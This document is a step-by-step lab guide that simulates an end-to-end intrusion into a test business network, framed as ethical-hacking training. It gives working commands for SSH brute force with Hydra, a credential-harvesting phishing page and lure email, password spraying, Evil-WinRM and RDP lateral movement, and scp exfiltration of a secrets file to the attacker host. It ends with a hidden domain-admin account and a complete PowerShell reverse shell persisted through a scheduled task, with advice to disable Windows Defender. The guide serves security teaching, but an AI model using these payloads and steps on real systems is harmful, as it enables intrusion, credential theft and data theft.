# Cyber Attack: Initial Access - Breached

## Table of Contents
- [Prerequisites](#prerequisites)
- [Network Topology](#network-topology)
- [Cyber Attack Overview](#cyber-attack-overview)
  - [Threat Actor Motivations](#threat-actor-motivations)
  - [Cyber Attack Anatomy](#cyber-attack-anatomy)
- [The Scenario](#the-scenario)
- [Guide Overview](#guide-overview)
- [Reconnaissance](#reconnaissance)
  - [Mandatory VMs Powered-On (Recon)](#mandatory-vms-powered-on-recon)
  - [Attack Graph (Recon)](#attack-graph-recon)
  - [Operations (Recon)](#operations-recon)
    - [Step 1 (Recon)](#step-1-recon)
    - [Step 2 (Recon)](#step-2-recon)
- [Initial Access](#initial-access)
  - [Mandatory VMs Powered-On (Initial Access)](#mandatory-vms-powered-on-initial-access)
  - [Attack Graph (Initial Access)](#attack-graph-initial-access)
  - [Operations (Initial Access)](#operations-initial-access)
    - [Step 1 – Discovery](#step-1--discovery)
    - [Step 2 – Setup the Lure](#step-2--setup-the-lure)
- [Send the Email](#send-the-email)
- [The Phish](#the-phish)
- [Lateral Movement + Privilege Escalation](#lateral-movement--privilege-escalation)
  - [Mandatory VMs Powered-On (Lateral Movement)](#mandatory-vms-powered-on-lateral-movement)
  - [Attack Graph (Lateral Movement)](#attack-graph-lateral-movement)
  - [Operations (Lateral Movement)](#operations-lateral-movement)
- [Lateral Movement 2.0](#lateral-movement-20)
  - [Mandatory VMs Powered-On (Lateral Movement 2.0)](#mandatory-vms-powered-on-lateral-movement-20)
  - [Attack Graph (Lateral Movement 2.0)](#attack-graph-lateral-movement-20)
  - [Operations (Lateral Movement 2.0)](#operations-lateral-movement-20)
- [Data Exfiltration](#data-exfiltration)
  - [Mandatory VMs Powered-On (Data Exfiltration)](#mandatory-vms-powered-on-data-exfiltration)
  - [Attack Graph (Data Exfiltration)](#attack-graph-data-exfiltration)
  - [Operations (Data Exfiltration)](#operations-data-exfiltration)
- [Persistence](#persistence)
  - [Mandatory VMs Powered-On (Persistence)](#mandatory-vms-powered-on-persistence)
  - [Attack Graph (Persistence)](#attack-graph-persistence)
  - [Operations (Persistence)](#operations-persistence)
    - [Create A Local Account](#create-a-local-account)
    - [Scheduled Task With Reverse Shell](#scheduled-task-with-reverse-shell)
- [Conclusion + Next Steps](#conclusion--next-steps)

---

## Prerequisites

1. **Baseline project-x network** has been provisioned and configured.
   - Guides X – X have been completed.
2. **[project-x-attacker] machine** has been provisioned and configured.
   - Reference [Guide] Setup Attacker Machine

---

## Network Topology



---

## Cyber Attack Overview

In this part of the lab series, we are going to simulate an end-to-end cyber-attack on ProjectX’s business network. The end goal is to capture sensitive files and achieve persistence inside the business network, so that we can log back in at our discretion. Up until this point, we have built an enterprise or business network to “emulate” a real-world environment, something you would often see deployed to a much larger scale in the real world.

---

### Threat Actor Motivations

Threat actors (will use this interchangeably with attacker) have various motives. Most of what you see on the major news outlets and dedicated security news websites are financially motivated attackers, opportunistic in conducting their operations in hopes of financial gain or extortion. Attackers can act alone, in a disparate community – using or helping others along the way, or in a selective group. Outside of financial motives, attackers can align with different motives. A few of the major ones are:

- **Espionage:** Nation-state actors may target governments, corporations, or organizations to gather intelligence, gain strategic advantages, or sabotage operations.
- **Disruption:** Hacktivists or adversaries may aim to disrupt services, systems, or operations to make a political or social statement or damage reputations.
- **Revenge or Retaliation:** Disgruntled employees or individuals may launch attacks to settle personal grievances or harm their targets.
- **Ideological or Political Agendas:** Cyberattacks may be motivated by an attempt to promote or enforce certain beliefs or ideologies, often tied to hacktivist movements.

---

### Cyber Attack Anatomy

Let’s overview the anatomy of a cyber-attack, reviewing the major steps involved to achieve our objective. Starting with the diagram below.

Each of these steps aims to achieve a specific outcome. To conduct a successful cyber-attack, it is imperative that attackers take proactive steps from initial access to persistence. These steps are leveraged in separate phases but are often chained together. For example, once an attacker gains initial access or lateral movement, they will perform additional reconnaissance on the network to see what is available. Most often, attackers want to stay hidden in the network with unfettered access for as long as possible. Each of these steps brings the attacker closer to their end goal or motive.

These steps were first built by Lockheed Martin as a conceptual model to understand and defend against cyber-attacks, known as the Cyber Attack Kill Chain. As the industry continued to mature its approach to proactive detection, the MITRE ATT&CK framework was built to expand these ideas by providing a real-world repository of tactics, techniques, and procedures (TTPs) used by threat actors, broken down into generalized steps attackers take to control a business or organization.

Let’s quickly overview each of these steps.

---

## The Scenario

In this lab, we are going to “simulate” each step by leveraging techniques and tools at our disposal as an attacker. By leveraging default, insecure, and outdated configurations and software, our attacker wants to use their skills for their own personal gain. These configurations, although outdated and disabled by default, can still often be found in business networks to this day.

Our attacker is financially motivated, attempting to steal sensitive data. They have identified ProjectX as a target organization to conduct their operations so they can extort and steal some sensitive information, perhaps a username, password, and proprietary file.

So let’s put on our (ethical) hacker hat and jump in.

---

## Guide Overview

Throughout this guide, you will find highlighted sections with questions or comments related to a quick tool or service overview.

In addition, you will find **"How Relevant Is This Today?"** sections which will highlight whether or not the technique showcased is really in use today.

One common pattern you will find in entry-level cybersecurity training content is outdated techniques and legacy systems in use. These attack techniques may not be as relevant or prolific as they once were. Tools receive updates and legacy systems are End-of-Life (EoL). These attack and legacy systems are still used to showcase the technique while remaining entry-level friendly.

It's good to know if these attack techniques and systems are still relevant today and that’s why there is a box to help you gauge how common this is.

You will also see a **"Mandatory VMs Powered-On"** section. These are the mandatory VMs that must be powered on. If your system is limited on resources, you can only have the following VMs on.

---

## Reconnaissance

Reconnaissance is the first phase of a cyber-attack where attackers gather information about their target to identify vulnerabilities they can exploit. This phase is all about preparation and involves collecting as much data as possible about the target's systems, network, employees, or infrastructure without triggering alarms.

### Mandatory VMs Powered-On (Recon)

- [project-x-sec-box]
- [project-x-email-svr]
- [project-x-attacker]

---

### Attack Graph (Recon)

*Attack graph diagram not included.*

---

### Operations (Recon)

#### Step 1 (Recon)
- Open a new terminal session in Kali Linux.
- Enter the following command:
  ```
  nmap -p1-1000 -Pn -sV 10.0.0.8/24
  ```
  - `-p`: Scan ports 1-1000.
  - `-sV`: Initiate service scan discovery.
  - `-Pn`: Bypass ping blocking.

#### Step 2 (Recon)
- It appears SSH is running as a service. We don’t yet know what kind of services or server this is – perhaps a jumphost, a license server, or email server.
- Proceed with attempting to log in using SSH. Leverage Hydra for a brute-force attack with a wordlist like `rockyou.txt`.
  - First, unzip or locate the `rockyou.txt` file (installed by default in Kali).
  - Use the Hydra command:
    ```
    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.8
    ```
  - Optionally, supply multiple usernames using the `-L` flag.
- Once Hydra identifies valid credentials, log in:
  ```
  ssh root@10.0.0.8
  ```
  - Use the password: `november`
- **Success!** We have achieved initial access for this phase.

*Additional tool notes:*
- **nmap (Network Mapper):** An open-source tool for network discovery and security auditing.
- **Hydra:** A password-cracking tool that automates brute-force attacks on various network services.

---

## Initial Access

Initial Access is the first phase in a cyber-attack where adversaries seek to establish a foothold in the target network or system. It is the gateway for attackers to gain entry, enabling them to progress through subsequent stages such as privilege escalation, lateral movement, and data exfiltration. We have already established initial access with this Ubuntu server by cracking the weak password.

Now, additional reconnaissance is performed to determine the device type, services running, and any connections to other devices.

### Mandatory VMs Powered-On (Initial Access)

- [project-x-sec-box]
- [project-x-email-svr]
- [project-x-attacker]
- [project-x-linux-client]

---

### Attack Graph (Initial Access)

*Attack graph diagram not included.*

---

### Operations (Initial Access)

#### Step 1 – Discovery
- Gather further information:
  - **OS Version and Distribution:**
    ```
    cat /etc/os-release
    ```
  - **Hostname:**
    ```
    hostname
    ```
  - **IP Address:**
    ```
    ip a
    ```
- Check for active services:
  - Use:
    ```
    netstat -tuln
    ```
  - Examine process information:
    ```
    ps aux
    top
    ```
  - Look for configuration files and user directories:
    ```
    ls -la /home
    ls -la /etc
    ls -la ~/.ssh/
    ```
  - Search for files containing “password”:
    ```
    find / -name "password" 2>/dev/null
    ```
- Perform an nmap scan on the network:
  ```
  nmap -sV 10.0.0.0/24
  ```
  - Note that SMTP might be running, indicating an email service.

*Note:* In real-world scenarios, the attacker’s machine would rarely be on the same network as the target.

#### Step 2 – Setup the Lure
- The attacker sets up a spear-phishing website mimicking a password verification portal.
- Build a static website to capture usernames and passwords:
  - Navigate to `/var/www/html`.
  - Clone the project files:
    ```
    git clone https://github.com/collinsmc23/projectsecurity-e101
    ```
  - Create a logging file:
    ```
    sudo touch /var/www/html/creds.log
    sudo chmod 666 /var/www/html/creds.log
    ```
  - Start Apache2:
    ```
    sudo service apache2 start
    ```
  - Verify by browsing to `http://localhost`.
- Test by submitting dummy credentials and confirming they are logged in `creds.log`.

---

## Send the Email

Craft a phishing email to lure the target into revealing credentials. For example, an email generated with ChatGPT:

> **Subject:** Important, Verify Password  
>  
> **Email Body:**  
> Dear Jane,  
>  
> We noticed an unusual login attempt on your account, and for your security, we have temporarily locked access. To restore access, please verify your account credentials within the next 24 hours. Failure to do so may result in permanent restrictions on your account.  
>  
> To verify your credentials, please click the link below:  
> **Verify My Account**  
>  
> For assistance, please contact our support team at support@company.com.  
>  
> Thank you for your prompt attention to this matter.  
>  
> Best regards,  
> ProjectX Security Team

- On [project-x-email-svr] (SSH login: `ssh root@10.0.0.8` with password `november`), create a file named `email.txt`:
  ```
  nano email.txt
  ```
- Insert the following HTML content:
  ```
  echo "<html><body><p>Dear [Recipient's First Name],

  We noticed an unusual login attempt on your account, and for your security, we have temporarily locked access. To restore access, please verify your account credentials within the next 24 hours. Failure to do so may result in permanent restrictions on your account.

  To verify your credentials, please click the link below:</p>

  <a href='http://10.0.0.50'>Verify My Account</a>

  <p>For assistance, please contact our support team at support@company.com.

  Thank you for your prompt attention to this matter.

  Best regards,
  ProjectX Security Team</p>" 
  ```
- Save the file and send the email:
  ```
  cat email.txt | mail -s "Important, Verify Password" janed@linux-client
  ```

---

## The Phish

- On [project-x-linux-client], open a terminal and check for new mail:
  ```
  mail
  ```
- Jane receives the phishing email.
- If Jane enters her credentials, they will be logged in `creds.log` on [project-x-attacker].
- Use the captured credentials to log in:
  ```
  ssh janed@10.0.0.101
  ```
- **Success!** Proceed to further reconnaissance and lateral movement.

---

## Lateral Movement + Privilege Escalation

After initial access, lateral movement allows attackers to navigate the network to access additional systems, resources, or data. Privilege escalation increases the attacker’s access level for further control.

### Mandatory VMs Powered-On (Lateral Movement)

- [project-x-sec-box]
- [project-x-linux-client]
- [project-x-win-client]
- [project-x-dc]
- [project-x-attacker]

---

### Attack Graph (Lateral Movement)

*Attack graph diagram not included.*

---

### Operations (Lateral Movement)

- Gather further system information:
  - **OS Details:**
    ```
    cat /etc/os-release
    ```
  - **Hostname:**
    ```
    hostname
    ```
  - **IP Address:**
    ```
    ip a
    ```
- Run an nmap scan to identify open ports:
  ```
  nmap -Pn -p1-65535 -sV 10.0.0.0/24
  ```
  - For time-saving, use `-p 5985,5986` when scanning for WinRM.
- Identify that ports 5985 and 5986 (WinRM) are open.
- Use a password spraying tool (e.g., NetExec):
  - Create a `users.txt` file with:
    ```
    Administrator
    ```
  - Create a `pass.txt` file with:
    ```
    @Deeboodah1!
    ```
  - Execute:
    ```
    nxc winrm 10.0.0.100 -u users.txt -p pass.txt
    ```
- Capture the Administrator credentials.
- Use **Evil-WinRM** to connect to [project-x-win-client]:
  ```
  evil-winrm -I 10.0.0.100 -u Administrator -p @Deeboodah1!
  ```
- **Success!** Administrator access has been achieved.

---

## Lateral Movement 2.0

Attackers often mix initial access, reconnaissance, and lateral movement iteratively.

### Mandatory VMs Powered-On (Lateral Movement 2.0)

- [project-x-sec-box]
- [project-x-win-client]
- [project-x-dc]
- [project-x-attacker]

---

### Attack Graph (Lateral Movement 2.0)

*Attack graph diagram not included.*

---

### Operations (Lateral Movement 2.0)

- Identify the domain controller details:
  ```
  nltest /dsgetdc:
  ```
- Scan for open ports on the domain controller; note that port 3389 (RDP) is open.
- Use `xfreerdp` to establish an RDP session:
  ```
  xfreerdp /v:10.0.0.5 /u:Administrator /p:@Deeboodah1! /d:corp.project-x-dc.com
  ```
- Gain access to the Domain Controller.
- Navigate the file system to locate the “Production Documents” folder.
- **Success!** You now have the means for data exfiltration.

---

## Data Exfiltration

Attackers extract sensitive data from a compromised network, such as intellectual property, customer records, or financial information, often using covert methods.

### Mandatory VMs Powered-On (Data Exfiltration)

- [project-x-sec-box]
- [project-x-dc]
- [project-x-attacker]

---

### Attack Graph (Data Exfiltration)

*Attack graph diagram not included.*

---

### Operations (Data Exfiltration)

- Use methods like cloud storage or SMB file sharing. For simplicity, use `scp`:
  - On the Domain Controller, navigate to:
    ```
    C:\Users\Administrator\Documents\ProductionFiles
    ```
  - Execute:
    ```
    scp ".\secrets.txt" attacker@10.0.0.50:/home/attacker/my_sensitive_file.txt
    ```
  - Enter the attacker’s password when prompted.
- Verify the file transfer to `/home/attacker`.
- **Success!**

---

## Persistence

Persistence ensures that the attacker can regain access even after the initial compromise is discovered.

### Mandatory VMs Powered-On (Persistence)

- [project-x-sec-box]
- [project-x-dc]
- [project-x-attacker]

---

### Attack Graph (Persistence)

*Attack graph diagram not included.*

---

### Operations (Persistence)

#### Create A Local Account
- Create a new user account to blend in:
  ```
  net user project-x-user @mysecurepassword1! /add
  net localgroup Administrators project-x-user /add
  net group "Domain Admins" project-x-user /add
  ```
- Verify the account:
  ```
  net user project-x-user /domain
  ```

#### Scheduled Task With Reverse Shell
- On the Kali machine, create a reverse shell script:
  ```
  sudo nano reverse.ps1
  ```
- Paste the following PowerShell script:
  ```powershell
  $ip = "10.0.0.50"      # Replace with your attacker's IP address
  $port = 4444           # Replace with the port number you want to listen on

  $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
  $stream = $client.GetStream()
  $writer = New-Object System.IO.StreamWriter($stream)
  $reader = New-Object System.IO.StreamReader($stream)
  $writer.AutoFlush = $true
  $writer.WriteLine("Connected to reverse shell!")
  while ($true) {
      try {
          # Read commands from the listener (attacker)
          $command = $reader.ReadLine()
          if ($command -eq 'exit') {
              break
          }
          # Execute the command on the target machine
          $output = Invoke-Expression $command 2>&1
          $writer.WriteLine($output)
      } catch {
          $writer.WriteLine("Error: $_")
      }
  }
  $client.Close()
  ```
- Save the file.
- Use a Python web server to host the script from [project-x-attacker]:
  ```
  python -m http.server
  ```
- On [project-x-dc], navigate to `http://10.0.0.50:8000` and download the `reverse.ps1` file.
- Move the file to:
  ```
  C:\Users\Administrator\AppData\Local\Microsoft\Windows\reverse.ps1
  ```
- Create a scheduled task to run the reverse shell daily at 12:00 PM:
  ```
  schtasks /create /tn "PersistenceTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Administrator\AppData\Local\Microsoft\Windows\reverse.ps1" /sc daily /st 12:00
  ```
- At 12:00 PM, open a listener on port 4444 on [project-x-attacker]:
  ```
  nc -lvnp 4444
  ```
- On [project-x-dc], execute:
  ```
  Set-ExecutionPolicy Unrestricted -Scope Process
  powershell.exe -executionpolicy -bypass .\reverse.ps1
  .\reverse.ps1
  ```
- You should see “Connected to reverse shell!” on the listener.
- *Note:* Windows Defender may block this; disable it if necessary.

---

## Conclusion + Next Steps

And with this, we have finished our attack from Initial Access to Breached.  
Now, is this scenario real-world? No. Not even close.  
This lab’s intention is to serve as a primer for how threat actors approach compromising a target organization. With various tools, techniques, and procedures, threat actors can leverage their skills, open-source knowledge, and even LLMs to achieve their objectives.

---

